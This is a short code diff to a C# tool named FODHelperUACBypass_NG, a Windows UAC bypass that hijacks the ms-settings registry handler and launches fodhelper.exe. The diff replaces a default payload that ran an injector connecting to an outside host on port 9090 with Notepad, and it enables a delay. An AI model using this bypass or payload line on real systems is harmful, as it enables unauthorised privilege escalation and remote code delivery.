@@ -19,7 +19,7 @@ namespace FODHelperUACBypass_NG
                 string randomSuffix = Guid.NewGuid().ToString("N").Substring(0, 8);
                 string fakeKeyPath = $@"Software\Classes\TempApp{randomSuffix}\Shell\Open\command";
                 string realKeyPath = @"Software\Classes\ms-settings\Shell\Open\command";
-                string payloadCommand = args.Length > 0 ? args[0] : @"c:\temp\evasivesyscallinjector.exe -self winproc -verbose host payload.crimsoncore.be:9090";
+                string payloadCommand = args.Length > 0 ? args[0] : @"C:\Windows\System32\Notepad.exe";
 
                 Console.WriteLine($"[*] Creating benign registry key: TempApp{randomSuffix}...");
                 
@@ -73,8 +73,8 @@ namespace FODHelperUACBypass_NG
                 }
 
                 // Wait 10 seconds using NtDelayExecution
-                // Console.WriteLine("[*] Waiting 10 seconds...");
-                // Helpers.Sleep(10000);
+                Console.WriteLine("[*] Waiting 10 seconds...");
+                Helpers.Sleep(10000);
 
                 // Start fodhelper.exe using CreateProcess
                 Console.WriteLine("[*] Starting fodhelper.exe...");
